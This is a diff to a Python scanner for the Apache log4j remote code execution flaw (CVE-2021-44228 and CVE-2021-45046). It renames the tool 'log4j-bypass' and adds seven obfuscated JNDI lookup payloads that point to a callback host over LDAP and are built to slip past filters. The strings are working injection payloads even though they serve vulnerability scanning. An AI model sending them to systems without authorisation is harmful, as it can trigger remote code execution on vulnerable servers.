@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # coding=utf-8
 # ******************************************************************
-# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
-# Modified by Megan Howell (CyberQueenMeg)
+# log4j-bypass: A generic scanner for Apache log4j RCE CVE-2021-44228
+# Created by Megan Howell (CyberQueenMeg)
 # ******************************************************************
 
 import argparse
@@ -47,6 +47,7 @@ default_headers = {
 post_data_parameters = ["username", "user", "email", "email_address", "password", "search"]
 timeout = 4
 
+# This list contains the bypasses being created after the initial exploit was patched
 bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                        "${jndi:rmi://{{callback_host}}}",
@@ -58,6 +59,13 @@ bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{cal
                        "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # CVE 2021 45046 Source: https://twitter.com/marcioalm/status/1471740771581652995,
                        "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}", # CVE 2021 45046
                        "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}", # CVE 2021 45046
+                       "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://{{callback_host}}/{{random}}}",
+                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}",
+                       "${jnd${sys:SYS_NAME:-i}:ldap:/{{callback_host}}/{{random}}}",
+                       "${jnd${upper:ı}:ldap://{{callback_host}}/{{random}}}", #invalid unicode
+                       "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//{{callback_host}}/{{random}}}",
+                       "${\u006a\u006e\u0064\u0069:ldap://{{callback_host}}/{{random}}}", #unicode characters
+                       "${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://{{callback_host}}/{{random}}}"
                        ]
 
 parser = argparse.ArgumentParser()
